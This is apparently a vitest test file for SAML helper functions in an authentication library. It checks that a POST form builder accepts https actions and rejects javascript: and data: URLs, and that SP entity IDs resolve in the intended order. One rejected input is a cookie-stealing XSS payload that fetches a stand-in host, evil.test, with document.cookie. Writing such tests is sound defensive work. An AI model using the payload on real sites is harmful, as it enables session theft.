import { APIError } from "better-auth/api";
import { describe, expect, it } from "vitest";
import type { SAMLConfig } from "../types";
import { createSAMLPostForm, resolveSpEntityId } from "./helpers";

const invalidSAMLBindingLocationMessage =
	"SAML POST binding location must be an absolute http or https URL";

function expectInvalidSAMLBindingLocation(action: string) {
	try {
		createSAMLPostForm(action, "SAMLResponse", "base64value");
		expect.unreachable();
	} catch (error) {
		expect(error).toBeInstanceOf(APIError);
		expect(error).toMatchObject({
			status: "BAD_REQUEST",
			statusCode: 400,
			message: invalidSAMLBindingLocationMessage,
			body: {
				message: invalidSAMLBindingLocationMessage,
			},
		});
	}
}

describe("createSAMLPostForm", () => {
	it("emits an http(s) form action", async () => {
		const res = createSAMLPostForm(
			"https://idp.example.com/slo",
			"SAMLResponse",
			"base64value",
		);
		const html = await res.text();
		expect(html).toContain('action="https://idp.example.com/slo"');
	});

	it("rejects a javascript: form action", () => {
		expectInvalidSAMLBindingLocation(
			"javascript:fetch('https://evil.test/x?c='+document.cookie)",
		);
	});

	it("rejects a data: form action", () => {
		expectInvalidSAMLBindingLocation("data:text/html,<script>1</script>");
	});
});

describe("resolveSpEntityId", () => {
	const base = (): SAMLConfig => ({
		issuer: "https://issuer.example",
		entryPoint: "https://idp.example/sso",
		cert: "CERT",
		callbackUrl: "https://sp.example/acs",
		spMetadata: {},
	});

	it("prefers explicit spMetadata.entityID", () => {
		const config = base();
		config.spMetadata = { entityID: "https://sp.example/explicit" };
		expect(resolveSpEntityId(config)).toBe("https://sp.example/explicit");
	});

	it("reads entityID from spMetadata.metadata XML when entityID field is absent", () => {
		const config = base();
		config.spMetadata = {
			metadata: `<EntityDescriptor entityID="https://sp.example/from-metadata" xmlns="urn:oasis:names:tc:SAML:2.0:metadata"><SPSSODescriptor/></EntityDescriptor>`,
		};
		expect(resolveSpEntityId(config)).toBe("https://sp.example/from-metadata");
	});

	it("falls back to issuer", () => {
		expect(resolveSpEntityId(base())).toBe("https://issuer.example");
	});
});
